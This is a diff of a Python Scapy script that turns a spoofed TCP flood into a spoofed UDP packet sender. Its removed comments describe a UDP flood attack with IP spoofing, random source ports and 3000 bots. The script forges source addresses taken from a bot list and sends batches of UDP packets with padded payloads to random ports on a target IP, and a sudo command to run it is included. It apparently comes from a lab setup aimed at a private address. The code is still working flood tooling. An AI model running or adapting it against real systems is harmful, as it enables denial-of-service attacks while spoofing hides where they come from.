@@ -5,16 +5,13 @@ import time
 import sys
 import ipaddress
 
-# Ataque simples UDP Flood, sem payload.
-# IP Spoofing, RandomSRCPort e 3000 bots.
-
-# CONFIGURAÇÃO DO ATAQUE
+# UDP-TCP Range Ports
 TARGET_IP = "192.168.100.2"
-TARGET_PORT = 50001
 BOTFILE = "bots.txt"
+NUM_PACKETS = 100
+PACKET_PAYLOAD_SIZE = 512
 
 def load_bots(filename):
-    """Colocar os bots do arquivo em uma lista."""
     bot_ips = []
 
     with open(filename, "r") as f:
@@ -26,8 +23,7 @@ def load_bots(filename):
 
     return bot_ips
 
-def run_tcp_flood_attack():
-    """TCP SYN Flood Attack"""
+def run_range_ports():
     bot_ips = load_bots(BOTFILE)
 
     numero_de_pacotes_enviados = 0
@@ -39,16 +35,16 @@ def run_tcp_flood_attack():
 
         ip_layer = IP(src=source_ip, dst=TARGET_IP)
         eth_layer = Ether()
-        seq_num = random.randint(0, 4294967295)
-        tcp_layer = TCP(sport=RandShort(),dport=TARGET_PORT, flags='E', seq=seq_num, window=8192)
+        udp_layer = UDP(sport=random.randint(1, 100), dport=random.randint(50000, 60000))
 
+        payload = b'*' * PACKET_PAYLOAD_SIZE
 
-        packet = eth_layer / ip_layer / tcp_layer 
+        packet = eth_layer / ip_layer / udp_layer / Raw(load=payload)
 
         lista_de_pacotes.append(packet)
         numero_de_pacotes_enviados += 1
 
-        if(numero_de_pacotes_enviados == 100):
+        if(numero_de_pacotes_enviados == NUM_PACKETS):
             break
 
 
@@ -57,12 +53,11 @@ def run_tcp_flood_attack():
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
-
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
 
 
 if __name__ == "__main__":
-    run_tcp_flood_attack()
+    run_range_ports()
 
-# sudo PYTHONPATH=$HOME/scapy python3 tcp_ece_flood.py
+# sudo PYTHONPATH=$HOME/scapy python3 udp-tcp_custom_ports.py
